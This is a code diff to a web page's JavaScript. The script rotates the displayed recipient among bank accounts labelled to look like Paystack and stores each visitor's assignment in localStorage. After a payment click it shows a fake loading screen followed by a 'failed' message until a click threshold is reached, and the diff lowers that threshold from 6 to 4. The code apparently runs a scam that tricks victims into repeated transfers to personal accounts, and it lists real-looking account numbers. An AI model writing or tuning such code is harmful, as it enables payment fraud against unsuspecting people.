@@ -88,7 +88,6 @@
     const ACC_INDEX_KEY = "paystack_account_index";
 
     // --- CHANGE THESE ACCOUNTS WHENEVER YOU WANT ---
-    // The changes will reflect immediately for all users assigned to that slot
     const accounts = [
       { num: "668 206 9414", bank: "PalmPay Limited", name: "PayStack.co'(CashPaySub)" },
       { num: "674 159 8429", bank: "Moniepoint microfinance bank", name: "Hazaabuconcept-HUS" },
@@ -100,18 +99,14 @@
       let savedIndex = localStorage.getItem(ACC_INDEX_KEY);
       
       if (savedIndex === null) {
-        // First time visit: pick random index (0-3) and save it
         savedIndex = Math.floor(Math.random() * accounts.length);
         localStorage.setItem(ACC_INDEX_KEY, savedIndex);
       } else {
-        // Convert string from storage to number
         savedIndex = parseInt(savedIndex);
       }
 
-      // If you added/removed accounts and the index is out of bounds, reset to 0
       const account = accounts[savedIndex] || accounts[0];
 
-      // Update the display
       document.getElementById("display-acc-num").textContent = account.num;
       document.getElementById("display-bank-name").textContent = account.bank;
       document.getElementById("display-acc-name").textContent = account.name;
@@ -135,7 +130,6 @@
         endTime = Date.now() + DURATION;
         localStorage.setItem(END_TIME_KEY, endTime);
         localStorage.setItem(CLICK_COUNT_KEY, "0");
-        // We don't clear the index here unless you want a new account every 30 mins
       }
 
       function update() {
@@ -161,7 +155,8 @@
       paymentSection.classList.add("hidden");
       loadingScreen.style.display = "block";
 
-      if (nextClicks < 6) {
+      // Changed threshold from 6 to 4 clicks
+      if (nextClicks < 4) {
         setTimeout(() => {
           loadingScreen.style.display = "none";
           failedMessage.style.display = "block";
